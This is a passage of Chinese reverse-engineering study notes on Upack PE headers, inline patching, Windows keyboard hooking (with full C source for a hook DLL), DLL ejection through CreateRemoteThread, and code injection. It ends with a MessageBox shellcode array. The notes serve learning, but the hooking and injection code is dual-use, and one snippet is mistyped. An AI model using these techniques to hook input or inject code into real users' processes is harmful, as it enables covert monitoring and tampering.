src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470727996.png" alt="步骤"></p><h1 id="0x0D-Upack-PE文件头详细分析"><a class="header-anchor" href="#0x0D-Upack-PE文件头详细分析">¶</a>0x0D-Upack PE文件头详细分析</h1><h2 id="重叠文件头"><a class="header-anchor" href="#重叠文件头">¶</a>重叠文件头</h2><p>因为DOS头尾部有一堆垃圾数据，所以将其修改并去除垃圾数据并修改e_lfanew，可以实现文件头重叠</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471521418.png" alt=""></p><h2 id="IMAGE-FILE-HEADER-SizeofOptionalHeader"><a class="header-anchor" href="#IMAGE-FILE-HEADER-SizeofOptionalHeader">¶</a>IMAGE_FILE_HEADER.SizeofOptionalHeader</h2><p>通过修改可选PE头的大小，可以向文件头插入解码代码。</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471656793.png" alt="可选PE头存在的原因"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471692584.png" alt=""></p><h2 id="IMAGE-OPTINAL-HEADER-NumberOfRvaAndSizes"><a class="header-anchor" href="#IMAGE-OPTINAL-HEADER-NumberOfRvaAndSizes">¶</a>IMAGE_OPTINAL_HEADER.NumberOfRvaAndSizes</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471789389.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471971897.png" alt=""></p><h2 id="IMAGE-SECTION-HEADER"><a class="header-anchor" href="#IMAGE-SECTION-HEADER">¶</a>IMAGE_SECTION_HEADER</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472047897.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472187949.png" alt="UPcak的重叠特征"></p><p>也就是说Upack先将notepad.exe压缩至第二个节区，运行时将第二个节区的代码解压至第一个节区</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472217512.png" alt="解压后的第一个节区"></p><h2 id="RVA-to-RAW"><a class="header-anchor" href="#RVA-to-RAW">¶</a>RVA to RAW</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472407155.png" alt=""></p><h2 id="导入表-v2"><a class="header-anchor" href="#导入表-v2">¶</a>导入表</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472531391.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472588438.png" alt=""></p><h2 id="导入地址表"><a class="header-anchor" href="#导入地址表">¶</a>导入地址表</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472781271.png" alt=""></p><h1 id="0x0E-Upack调试-查找OEP"><a class="header-anchor" href="#0x0E-Upack调试-查找OEP">¶</a>0x0E-Upack调试-查找OEP</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473884976.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473962763.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473977290.png" alt=""></p><h1 id="0x0F-内嵌补丁"><a class="header-anchor" href="#0x0F-内嵌补丁">¶</a>0x0F-内嵌补丁</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474031264.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474156707.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474124006.png" alt="内嵌补丁与代码补丁的区别"></p><h2 id="程序分析"><a class="header-anchor" href="#程序分析">¶</a>程序分析</h2><p>先对附件进行分析</p><p>弹出的对话框要求解压其本身</p><p>对地址4010F5的第一次异或</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482257261.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482352736.png" alt="401007地址的值异或7"></p><p>再次对4010F5进行异或操作，解密</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482387580.png" alt=""></p><p>可以看到这里对地址的值进行校验，每次取出四个字节相加，所以当我们修改了内容时需要对校验部分修改</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482453215.png" alt="校验"></p><p>所以解码完的部分存在我们要找的字符串</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482646487.png" alt=""></p><p>对401090地址的值进行异或</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482685919.png" alt="异或"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482728534.png" alt="大致流程"></p><h2 id="内嵌补丁练习"><a class="header-anchor" href="#内嵌补丁练习">¶</a>内嵌补丁练习</h2><p>因为我们要打补丁的字符串位于B区，而B区进行了双重加密，而且对其内容进行了校验，所以采用内嵌补丁</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482908373.png" alt="内嵌补丁"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649483145646.png" alt=""></p><p>因为节区要对齐，所以可能存在空白节区，那我们就可以在节区末尾添加我们的洞穴代码</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484195488.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484706889.png" alt=""></p><p>然后让程序先跳转到我们这个地址，再在这段代码最后一句，加上跳回原本程序的代码</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484859772.png" alt="程序原本的跳转"></p><p>但是要注意一点，就是我们插入的是已经解完密的jmp，而实际在文件中，这里的jmp是被加密的，所以要先对我们的修改进行加密，也就是xor 7</p><h1 id="0x10-Windows消息钩取"><a class="header-anchor" href="#0x10-Windows消息钩取">¶</a>0x10-Windows消息钩取</h1><p>windows消息机制</p><p><a href="https://blog.csdn.net/alzzw/article/details/108217879">https://blog.csdn.net/alzzw/article/details/108217879</a></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649486465228.png" alt="windows消息流"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649486637330.png" alt="消息钩取工作原理"></p><p>我们设置的钩子能在应用程序之前获取到OS相应信息</p><blockquote><p>SetwindowsHookEx()</p><p>HHOOK SetWindowsHookExA(<br>[in] int       idHook,// 要安装的挂钩过程的类型<br>[in] HOOKPROC  lpfn,// 指向挂钩过程的指针<br>[in] HINSTANCE hmod,// 所指向的挂钩过程的 DLL 的句柄<br>[in] DWORD     dwThreadId<br>);</p></blockquote><p>main.cpp</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"conio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    DEF_DLL_NAME        <span class="meta-string">"KeyHook.dll"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    DEF_HOOKSTART        <span class="meta-string">"HookStart"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    DEF_HOOKSTOP        <span class="meta-string">"HookStop"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    HMODULE    hDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTART    HookStart = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTOP    HookStop = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span>    ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载KeyHook.dll</span></span><br><span class="line">    hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LoadLibrary(%s) failed!!! [%d]"</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取导出函数地址</span></span><br><span class="line">    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始钩取</span></span><br><span class="line">    HookStart();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待，直到用户输入“q”</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"press 'q' to quit!\n"</span>);</span><br><span class="line">    <span class="keyword">while</span> (_getch() != <span class="string">'q'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 终止钩子</span></span><br><span class="line">    HookStop();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 卸载KeyHook.dll</span></span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>KeyHook.dll</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//KeyHook.cpp</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义目标进程名为notepad.exe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME <span class="meta-string">"notepad.exe"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//DllMain()函数在DLL被加载到进程后会自动执行</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span>{</span><br><span class="line"><span class="keyword">switch</span>( dwReason ){</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span>{</span><br><span class="line"><span class="keyword">char</span> szPath[MAX_PATH] = {<span class="number">0</span>,};</span><br><span class="line"><span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> ){</span><br><span class="line"> </span><br><span class="line"><span class="comment">//释放键盘按键时，bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line"><span class="keyword">if</span>( !(lParam &amp; <span class="number">0x80000000</span>) ){</span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">'\\'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="comment">//_stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0</span></span><br><span class="line"><span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) ){</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">//比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="comment">//在C++中调用C的库文件，用extern "C"告知编译器，因为C++支持函数重载而C不支持，两者的编译规则不同</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span>{</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">//__declspec，针对编译器的关键字，用于指出导出函数</span></span><br><span class="line"><span class="comment">//当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链</span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span>{</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span></span>{</span><br><span class="line"><span class="keyword">if</span>(g_hHook){</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p>调用导出函数HookStart()时，SetWindowsHookEx()函数就会把KeyboardProc()添加到键盘钩链</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649491980722.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492021056.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492216354.png" alt="调试过程"></p><h1 id="0x11-恶意键盘记录器"><a class="header-anchor" href="#0x11-恶意键盘记录器">¶</a>0x11-恶意键盘记录器</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492949992.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649493348476.png" alt="DLL注入"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649493419347.png" alt="DLL_Main函数"></p><p><a href="https://blog.csdn.net/tiandao2009/article/details/79839182">https://blog.csdn.net/tiandao2009/article/details/79839182</a>  dllmain函数的不同情形</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649494188248.png" alt="DLL注入方法"></p><h1 id="0x12-DLL卸载"><a class="header-anchor" href="#0x12-DLL卸载">¶</a>0x12-DLL卸载</h1><h2 id="获取目标进程的句柄"><a class="header-anchor" href="#获取目标进程的句柄">¶</a>获取目标进程的句柄</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID);</span><br></pre></td></tr></tbody></table></figure><p>该语句使用进程ID来获取目标进程的进程句柄，下面用获得的进程句柄调用CreateRemoteThread()</p><h2 id="获取FreeLibrary-地址"><a class="header-anchor" href="#获取FreeLibrary-地址">¶</a>获取FreeLibrary()地址</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hModule=GetModule(<span class="string">L"kernel32.dll);</span></span><br><span class="line"><span class="string">pThreadProc=(LPTHREAD_START_ROUTINE)GetProcAddress(hModule,"</span>FreeLibrary<span class="string">");</span></span><br></pre></td></tr></tbody></table></figure><p>若要使目标进程自己调用FreeLibrary()，需要先获得FreeLibrary()的地址。然而上述代码获得的不是加载到目标进程中的FreeLibrary()的地址，而是EjectDll.exe进程中FreeLibrary()的地址，但是FreeLibrary在所有进程中地址是相同的</p><h2 id="在目标进程中运行线程"><a class="header-anchor" href="#在目标进程中运行线程">¶</a>在目标进程中运行线程</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hThread=CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,pThreadProc,me.modBaseAddr,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure><p>pThreadProc参数是FreeLibrary()的地址，me.modBaseAddr参数是要卸载的DLL的加载地址。将线程函数指定为FreeLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p><blockquote><p>CreateRemoteThread()原意是在外部线程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p></blockquote><h2 id="注意事项"><a class="header-anchor" href="#注意事项">¶</a>注意事项</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649660793447.png" alt=""></p><h1 id="0x13-通过修改PE加载DLL"><a class="header-anchor" href="#0x13-通过修改PE加载DLL">¶</a>0x13-通过修改PE加载DLL</h1><p>也就是修改导入表来使得PE文件运行时直接加载dll</p><p>晚点看</p><h1 id="0x14-代码注入"><a class="header-anchor" href="#0x14-代码注入">¶</a>0x14-代码注入</h1><p>代码注入是一种向目标进程插入独立运行代码并使之运行的技术，他一般调用CreateRemoteThread()以远程线程形式运行插入的代码，所以也被称为线程注入</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662082787.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662157677.png" alt=""></p><p>也就是说DLL是将整个DLL注入进程中，而代码注入只是注入必要的代码，所以同时也要报要操作的数据进行注入</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662257437.png" alt="使用代码注入的原因"></p><h1 id="0x15-汇编代码注入"><a class="header-anchor" href="#0x15-汇编代码注入">¶</a>0x15-汇编代码注入</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649924174583.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925196328.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925229842.png" alt=""></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925283278.png" alt="关闭自动填充nop"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649926423283.png" alt=""></p><p>接下来将插入的asm的机器码进行复制，并修改格式</p><p>得到</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = {</span><br><span class="line"><span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0x08</span>,<span class="number">0x68</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x54</span>,<span class="number">0xFF</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x6F</span>,<span class="number">0x78</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x67</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x4D</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x54</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0x56</span>,<span class="number">0x04</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x0C</span></span><br><span class="line">,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x00</span>,<span class="number">0xE8</span></span><br><span class="line">,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x63</span></span><br><span class="line">,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span></span><br><span class="line">,<span class="number">0x5D</span>,<span class="number">0xC3</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649985152689.png" alt=""></p><p><img 